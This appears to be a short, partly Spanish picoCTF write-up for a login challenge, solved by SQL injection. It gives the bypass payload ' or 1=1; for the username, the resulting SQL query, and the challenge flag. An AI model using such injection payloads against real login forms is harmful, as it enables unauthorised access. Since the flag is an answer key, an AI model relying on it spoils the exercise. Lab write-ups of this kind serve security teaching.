# Objetivo 
There is a website running at `https://jupiter.challenges.picoctf.org/problem/39720/` ([link](https://jupiter.challenges.picoctf.org/problem/39720/)) or http://jupiter.challenges.picoctf.org:39720. Do you think you can log us in? Try to see if you can login!
# Solución 
```



```

username #'# or 1=1

username: ' or 1=1;  --- Nos sierve para poder hacer el cambio de que pase sin tener usuario ni contraseña 
password: 123456
SQL query: SELECT * FROM users WHERE name='' or 1=1;' AND password='123456'

# Logged in!

Your flag is: picoCTF{s0m3_SQL_c218b685}
# Notas 

